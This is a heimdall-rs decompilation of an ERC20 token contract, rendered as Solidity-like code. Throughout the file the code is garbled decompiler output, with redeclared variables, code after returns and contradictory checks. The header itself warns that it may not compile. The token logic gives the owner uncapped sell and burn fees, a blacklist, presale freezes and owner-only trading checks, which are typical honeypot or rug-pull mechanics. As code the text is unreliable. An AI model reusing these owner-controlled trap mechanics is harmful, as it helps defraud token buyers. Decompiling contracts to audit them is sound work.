// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/// @title            Decompiled Contract
/// @author           Jonathan Becker <jonathan@jbecker.dev>
/// @custom:version   heimdall-rs v0.9.0
///
/// @notice           This contract was decompiled using the heimdall-rs decompiler.
///                     It was generated directly by tracing the EVM opcodes from this contract.
///                     As a result, it may not compile or even be valid solidity code.
///                     Despite this, it should be obvious what each function does. Overall
///                     logic should have been preserved throughout decompiling.
///
/// @custom:github    You can find the open-source decompiler here:
///                       https://heimdall.rs

contract DecompiledContract {
    uint256 public constant decimals = 18;
    
    bool public requiredTokenRuleOn;
    address public requiredToken;
    mapping(bytes32 => bytes32) storage_map_j;
    bool public presaleHolderLock;
    bytes32 store_p;
    uint256 public burnFee;
    bytes32 store_a;
    address public owner;
    mapping(bytes32 => bytes32) storage_map_b;
    uint256 public maxHoldingAmount;
    uint256 public requiredTokenAmount;
    uint256 public totalSupply;
    bool public limitOn;
    uint256 public sellFee;
    mapping(bytes32 => bytes32) storage_map_o;
    address public pair;
    
    event Transfer(address, address, uint256);
    event Approval(address, address, uint256);
    event OwnershipTransferred(address, address);
    
    /// @custom:selector    0x06fdde03
    /// @custom:signature   name() public view returns (string memory)
    function name() public view returns (string memory) {
        if (store_a) {
            if (store_a - ((store_a >> 0x01) < 0x20)) {
                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                var_b = 0x22;
                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));
                bytes32 var_d = store_a >> 0x01;
                if (store_a) {
                    if (store_a - ((store_a >> 0x01) < 0x20)) {
                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                        var_b = 0x22;
                        if (!store_a >> 0x01) {
                            if (0x1f < (store_a >> 0x01)) {
                                var_a = 0x03;
                                var_e = storage_map_b[var_a];
                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {
                                    var_e = 0x20;
                                    uint256 var_f = var_c.length;
                                    uint256 var_g = 0;
                                    return abi.encodePacked(0x20, var_c.length);
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    /// @custom:selector    0x39509351
    /// @custom:signature   increaseAllowance(address arg0, uint256 arg1) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {
        require(arg0 == (address(arg0)));
        address var_a = address(msg.sender);
        var_b = 0x01;
        var_a = address(arg0);
        address var_b = keccak256(var_a);
        require(!(storage_map_b[var_a] > (arg1 + storage_map_b[var_a])), "ERC20: approve to the zero address");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_c = 0x11;
        require(address(msg.sender), "ERC20: approve to the zero address");
        require(address(arg0), "ERC20: approve to the zero address");
        var_a = address(msg.sender);
        var_b = 0x01;
        var_a = address(arg0);
        var_b = keccak256(var_a);
        storage_map_b[var_a] = arg1 + storage_map_b[var_a];
        uint256 var_d = arg1 + storage_map_b[var_a];
        emit Approval(address(msg.sender), address(arg0), arg1 + storage_map_b[var_a]);
        var_d = 0x01;
        return 0x01;
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x22;
        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;
        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x24;
        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;
        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0x4a13dfe7
    /// @custom:signature   Unresolved_4a13dfe7(uint256 arg0) public pure
    /// @param              arg0 ["uint256", "bytes32", "int256"]
    function Unresolved_4a13dfe7(uint256 arg0) public pure {
        require(arg0 == arg0);
    }
    
    /// @custom:selector    0xa457c2d7
    /// @custom:signature   decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {
        require(arg0 == (address(arg0)));
        address var_a = address(msg.sender);
        var_b = 0x01;
        var_a = address(arg0);
        address var_b = keccak256(var_a);
        require(!(storage_map_b[var_a] < arg1), "ERC20: decreased allowance below zero");
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x25;
        var_f = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;
        var_g = 0x207a65726f000000000000000000000000000000000000000000000000000000;
        require(address(msg.sender), "ERC20: approve to the zero address");
        require(address(arg0), "ERC20: approve to the zero address");
        var_a = address(msg.sender);
        var_b = 0x01;
        var_a = address(arg0);
        var_b = keccak256(var_a);
        storage_map_b[var_a] = storage_map_b[var_a] - arg1;
        uint256 var_c = storage_map_b[var_a] - arg1;
        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] - arg1);
        var_c = 0x01;
        return 0x01;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x22;
        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;
        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x24;
        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;
        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0x4a2bf86f
    /// @custom:signature   requiredTokenAddress(address arg0) public payable
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function requiredTokenAddress(address arg0) public payable {
        require(arg0 == (address(arg0)));
        require(msg.sender == (address(owner)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x20;
        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        requiredToken = (address(arg0)) | (uint96(requiredToken));
    }
    
    /// @custom:selector    0x23b872dd
    /// @custom:signature   Unresolved_23b872dd(address arg0) public pure
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function Unresolved_23b872dd(address arg0) public pure {
        require(arg0 == (address(arg0)));
    }
    
    /// @custom:selector    0xa3c0a173
    /// @custom:signature   setAmmounts(uint256 arg0, uint256 arg1) public payable
    /// @param              arg0 ["uint256", "bytes32", "int256"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function setAmmounts(uint256 arg0, uint256 arg1) public payable {
        require(msg.sender == (address(owner)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x20;
        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        maxHoldingAmount = arg0;
        requiredTokenAmount = arg1;
    }
    
    /// @custom:selector    0x153b0d1e
    /// @custom:signature   Unresolved_153b0d1e(address arg0, uint256 arg1) public payable
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function Unresolved_153b0d1e(address arg0, uint256 arg1) public payable {
        require(arg0 == (address(arg0)));
        require(arg1 == arg1);
        require(msg.sender == (address(owner)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x20;
        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        address var_e = address(arg0);
        var_f = 0x0b;
        storage_map_j[var_e] = arg1 | (uint248(storage_map_j[var_e]));
    }
    
    /// @custom:selector    0x66c4b782
    /// @custom:signature   setBurn(uint256 arg0) public payable
    /// @param              arg0 ["uint256", "bytes32", "int256"]
    function setBurn(uint256 arg0) public payable {
        require(msg.sender == (address(owner)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x20;
        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        burnFee = arg0;
    }
    
    /// @custom:selector    0x095ea7b3
    /// @custom:signature   approve(address arg0, uint256 arg1) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function approve(address arg0, uint256 arg1) public payable returns (bool) {
        require(arg0 == (address(arg0)));
        require(address(msg.sender), "ERC20: approve to the zero address");
        require(address(arg0), "ERC20: approve to the zero address");
        address var_a = address(msg.sender);
        var_b = 0x01;
        var_a = address(arg0);
        address var_b = keccak256(var_a);
        storage_map_b[var_a] = arg1;
        uint256 var_c = arg1;
        emit Approval(address(msg.sender), address(arg0), arg1);
        var_c = 0x01;
        return 0x01;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x22;
        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;
        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x24;
        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;
        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0xf2fde38b
    /// @custom:signature   transferOwnership(address arg0) public payable
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function transferOwnership(address arg0) public payable {
        require(arg0 == (address(arg0)));
        require(msg.sender == (address(owner)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x20;
        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        require(address(arg0), "Ownable: new owner is the zero address");
        owner = (address(arg0)) | (uint96(owner));
        emit OwnershipTransferred(address(owner), address(arg0));
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x26;
        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;
        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0x42966c68
    /// @custom:signature   burn(uint256 arg0) public payable
    /// @param              arg0 ["uint256", "bytes32", "int256"]
    function burn(uint256 arg0) public payable {
        require(address(msg.sender), "Blacklisted");
        uint256 var_a = 0;
        var_b = 0x0b;
        require(!(!bytes1(storage_map_b[var_a])), "Blacklisted");
        require(!(bytes1(storage_map_b[var_a])), "Blacklisted");
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x0b;
        var_f = 0x426c61636b6c6973746564000000000000000000000000000000000000000000;
        require(bytes1(limitOn), "Presale tokens are currently frozen.");
        require(bytes1(limitOn / 0x0100), "Presale tokens are currently frozen.");
        require(bytes1(limitOn / 0x0100), "Presale tokens are currently frozen.");
        require(!(bytes1(limitOn / 0x010000)), "Presale tokens are currently frozen.");
        require(!(address(pair) == (address(msg.sender))), "Presale tokens are currently frozen.");
        require(!(bytes1(requiredTokenRuleOn)), "Presale tokens are currently frozen.");
        require(!(address(pair) == 0), "Presale tokens are currently frozen.");
        require(!(bytes1(presaleHolderLock)), "Presale tokens are currently frozen.");
        var_a = address(msg.sender);
        var_b = 0x0f;
        require(!storage_map_b[var_a], "Presale tokens are currently frozen.");
        var_a = address(msg.sender);
        var_b = 0x0f;
        uint256 var_b = 0;
        require(!((storage_map_b[var_a] - arg0) > storage_map_b[var_a]), "Presale tokens are currently frozen.");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_g = 0x11;
        require(!((storage_map_b[var_a] - arg0) < storage_map_b[var_a]), "Presale tokens are currently frozen.");
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x24;
        var_f = 0x50726573616c6520746f6b656e73206172652063757272656e746c792066726f;
        var_h = 0x7a656e2e00000000000000000000000000000000000000000000000000000000;
        var_a = address(msg.sender);
        var_b = 0;
        require(!(storage_map_b[var_a] < arg0), "ERC20: burn amount exceeds balance");
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x22;
        var_f = 0x45524332303a206275726e20616d6f756e7420657863656564732062616c616e;
        var_h = 0x6365000000000000000000000000000000000000000000000000000000000000;
        var_a = address(msg.sender);
        var_b = 0;
        storage_map_b[var_a] = storage_map_b[var_a] - arg0;
        totalSupply = totalSupply - arg0;
        uint256 var_c = arg0;
        emit Transfer(address(msg.sender), 0, arg0);
        var_c = 0x70a0823100000000000000000000000000000000000000000000000000000000;
        address var_d = address(msg.sender);
        (bool success, bytes memory ret0) = address(requiredToken).Unresolved_70a08231(var_d); // staticcall
        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));
        require(!(((var_i + ret0.length) - var_i) < 0x20), "Insufficient Finale balance in wallet to sell.");
        require(!(var_i.length < requiredTokenAmount), "Insufficient Finale balance in wallet to sell.");
        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x2e;
        var_h = 0x496e73756666696369656e742046696e616c652062616c616e636520696e2077;
        var_k = 0x616c6c657420746f2073656c6c2e000000000000000000000000000000000000;
        if (!requiredTokenRuleOn) {
        }
        var_a = 0;
        var_b = 0;
        require(!(storage_map_b[var_a] > (arg0 + storage_map_b[var_a])), "Max holding amount exceeded");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_g = 0x11;
        require(!((arg0 + storage_map_b[var_a]) > maxHoldingAmount), "Max holding amount exceeded");
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x1b;
        var_f = 0x4d617820686f6c64696e6720616d6f756e742065786365656465640000000000;
        if (!limitOn / 0x010000) {
        }
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x13;
        var_f = 0x53656c6c696e67206e6f7420656e61626c656400000000000000000000000000;
        require(address(owner) == (address(msg.sender)), "Trading not enabled");
        require(address(owner) == 0, "Trading not enabled");
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x13;
        var_f = 0x54726164696e67206e6f7420656e61626c656400000000000000000000000000;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x21;
        var_f = 0x45524332303a206275726e2066726f6d20746865207a65726f20616464726573;
        var_h = 0x7300000000000000000000000000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0xa9059cbb
    /// @custom:signature   transfer(address arg0, uint256 arg1) public payable
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function transfer(address arg0, uint256 arg1) public payable {
        require(arg0 == (address(arg0)));
        require(!(bytes1(limitOn / 0x01000000)), "Blacklisted");
        require(!(!(address(pair)) == (address(arg0))), "Blacklisted");
        require((sellFee == ((sellFee * arg1) / arg1)) | !arg1, "Blacklisted");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_b = 0x11;
        require(0x64, "Blacklisted");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_b = 0x12;
        require((burnFee == ((burnFee * arg1) / arg1)) | !arg1, "Blacklisted");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_b = 0x11;
        require(0x64, "Blacklisted");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_b = 0x12;
        require(!((arg1 - ((sellFee * arg1) / 0x64)) > arg1), "Blacklisted");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_b = 0x11;
        require(!((arg1 - ((sellFee * arg1) / 0x64)) - ((burnFee * arg1) / 0x64) > (arg1 - ((sellFee * arg1) / 0x64))), "Blacklisted");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_b = 0x11;
        require(address(msg.sender), "Blacklisted");
        require(address(limitOn / 0x0100000000), "Blacklisted");
        address var_a = address(limitOn / 0x0100000000);
        var_c = 0x0b;
        require(!(!bytes1(storage_map_b[var_a])), "Blacklisted");
        require(!(bytes1(storage_map_b[var_a])), "Blacklisted");
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x0b;
        var_g = 0x426c61636b6c6973746564000000000000000000000000000000000000000000;
        require(bytes1(limitOn), "Presale tokens are currently frozen.");
        require(bytes1(limitOn / 0x0100), "Presale tokens are currently frozen.");
        require(bytes1(limitOn / 0x0100), "Presale tokens are currently frozen.");
        require(!(bytes1(limitOn / 0x010000)), "Presale tokens are currently frozen.");
        require(!(address(pair) == (address(msg.sender))), "Presale tokens are currently frozen.");
        require(!(bytes1(requiredTokenRuleOn)), "Presale tokens are currently frozen.");
        require(!(address(pair) == (address(limitOn / 0x0100000000))), "Presale tokens are currently frozen.");
        require(!(bytes1(presaleHolderLock)), "Presale tokens are currently frozen.");
        var_a = address(msg.sender);
        var_c = 0x0f;
        require(!storage_map_b[var_a], "Presale tokens are currently frozen.");
        var_a = address(msg.sender);
        var_c = 0x0f;
        uint256 var_c = 0;
        require(!(storage_map_b[var_a] - ((sellFee * arg1) / 0x64) > storage_map_b[var_a]), "Presale tokens are currently frozen.");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_b = 0x11;
        require(!(storage_map_b[var_a] - ((sellFee * arg1) / 0x64) < storage_map_b[var_a]), "Presale tokens are currently frozen.");
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x24;
        var_g = 0x50726573616c6520746f6b656e73206172652063757272656e746c792066726f;
        var_h = 0x7a656e2e00000000000000000000000000000000000000000000000000000000;
        var_a = address(msg.sender);
        var_c = 0;
        require(!(storage_map_b[var_a] < ((sellFee * arg1) / 0x64)), "ERC20: transfer amount exceeds balance");
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x26;
        var_g = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;
        var_h = 0x616c616e63650000000000000000000000000000000000000000000000000000;
        var_a = address(msg.sender);
        var_c = 0;
        storage_map_b[var_a] = storage_map_b[var_a] - ((sellFee * arg1) / 0x64);
        var_a = address(limitOn / 0x0100000000);
        storage_map_b[var_a] = ((sellFee * arg1) / 0x64) + storage_map_b[var_a];
        uint256 var_d = (sellFee * arg1) / 0x64;
        emit Transfer(address(msg.sender), address(limitOn / 0x0100000000), (sellFee * arg1) / 0x64);
        require(address(msg.sender), "ERC20: burn from the zero address");
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x21;
        var_g = 0x45524332303a206275726e2066726f6d20746865207a65726f20616464726573;
        var_h = 0x7300000000000000000000000000000000000000000000000000000000000000;
        var_d = 0x70a0823100000000000000000000000000000000000000000000000000000000;
        address var_e = address(msg.sender);
        (bool success, bytes memory ret0) = address(requiredToken).Unresolved_70a08231(var_e); // staticcall
        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));
        require(!(((var_i + ret0.length) - var_i) < 0x20), "Insufficient Finale balance in wallet to sell.");
        require(!(var_i.length < requiredTokenAmount), "Insufficient Finale balance in wallet to sell.");
        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_f = 0x20;
        var_g = 0x2e;
        var_h = 0x496e73756666696369656e742046696e616c652062616c616e636520696e2077;
        var_k = 0x616c6c657420746f2073656c6c2e000000000000000000000000000000000000;
        if (!requiredTokenRuleOn) {
        }
        var_a = address(limitOn / 0x0100000000);
        var_c = 0;
        require(!(storage_map_b[var_a] > (((sellFee * arg1) / 0x64) + storage_map_b[var_a])), "Max holding amount exceeded");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_b = 0x11;
        require(!(((sellFee * arg1) / 0x64) + storage_map_b[var_a] > maxHoldingAmount), "Max holding amount exceeded");
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x1b;
        var_g = 0x4d617820686f6c64696e6720616d6f756e742065786365656465640000000000;
        if (!limitOn / 0x010000) {
        }
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x13;
        var_g = 0x53656c6c696e67206e6f7420656e61626c656400000000000000000000000000;
        require(address(owner) == (address(msg.sender)), "Trading not enabled");
        require(address(owner) == (address(limitOn / 0x0100000000)), "Trading not enabled");
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x13;
        var_g = 0x54726164696e67206e6f7420656e61626c656400000000000000000000000000;
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x23;
        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;
        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x25;
        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;
        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0x70a08231
    /// @custom:signature   balanceOf(address arg0) public view returns (uint256)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function balanceOf(address arg0) public view returns (uint256) {
        require(arg0 == (address(arg0)));
        address var_a = address(arg0);
        uint256 var_b = 0;
        address var_c = storage_map_b[var_a];
        return storage_map_b[var_a];
    }
    
    /// @custom:selector    0xb4f2e8b8
    /// @custom:signature   setFee(uint256 arg0, address arg1) public payable
    /// @param              arg0 ["uint256", "bytes32", "int256"]
    /// @param              arg1 ["address", "uint160", "bytes20", "int160"]
    function setFee(uint256 arg0, address arg1) public payable {
        require(arg1 == (address(arg1)));
        require(msg.sender == (address(owner)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x20;
        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        sellFee = arg0;
        limitOn = (uint96(limitOn)) | (0x0100000000 * (address(arg1)));
    }
    
    /// @custom:selector    0xf9f92be4
    /// @custom:signature   blacklist(address arg0) public view returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function blacklist(address arg0) public view returns (bool) {
        require(arg0 == (address(arg0)));
        var_a = 0x0b;
        address var_b = arg0;
        address var_c = !(!bytes1(storage_map_o[var_b]));
        return !(!bytes1(storage_map_o[var_b]));
    }
    
    /// @custom:selector    0x95d89b41
    /// @custom:signature   symbol() public view returns (string memory)
    function symbol() public view returns (string memory) {
        if (store_p) {
            if (store_p - ((store_p >> 0x01) < 0x20)) {
                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                var_b = 0x22;
                uint256 var_c = var_c + (0x20 + (((0x1f + (store_p >> 0x01)) / 0x20) * 0x20));
                bytes32 var_d = store_p >> 0x01;
                if (store_p) {
                    if (store_p - ((store_p >> 0x01) < 0x20)) {
                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                        var_b = 0x22;
                        if (!store_p >> 0x01) {
                            if (0x1f < (store_p >> 0x01)) {
                                var_a = 0x04;
                                var_e = storage_map_b[var_a];
                                if ((0x20 + var_c) + (store_p >> 0x01) > (0x20 + (0x20 + var_c))) {
                                    var_e = 0x20;
                                    uint256 var_f = var_c.length;
                                    uint256 var_g = 0;
                                    return abi.encodePacked(0x20, var_c.length);
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    /// @custom:selector    0xdd62ed3e
    /// @custom:signature   Unresolved_dd62ed3e(address arg0) public pure
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function Unresolved_dd62ed3e(address arg0) public pure {
        require(arg0 == (address(arg0)));
    }
    
    /// @custom:selector    0x715018a6
    /// @custom:signature   renounceOwnership() public payable
    function renounceOwnership() public payable {
        require(msg.sender == (address(owner)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x20;
        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        owner = 0 | (uint96(owner));
        emit OwnershipTransferred(address(owner), 0);
    }
    
    /// @custom:selector    0x2575e004
    /// @custom:signature   presaleBalancesStore(address arg0) public view returns (uint256)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function presaleBalancesStore(address arg0) public view returns (uint256) {
        require(arg0 == (address(arg0)));
        var_a = 0x0f;
        address var_b = arg0;
        address var_c = storage_map_o[var_b];
        return storage_map_o[var_b];
    }
    
    /// @custom:selector    0x9985ad83
    /// @custom:signature   Unresolved_9985ad83(uint256 arg0) public payable
    /// @param              arg0 ["uint256", "bytes32", "int256"]
    function Unresolved_9985ad83(uint256 arg0) public payable {
        require(arg0 == arg0);
        require(msg.sender == (address(owner)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x20;
        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        presaleHolderLock = arg0 | (uint248(presaleHolderLock));
    }
}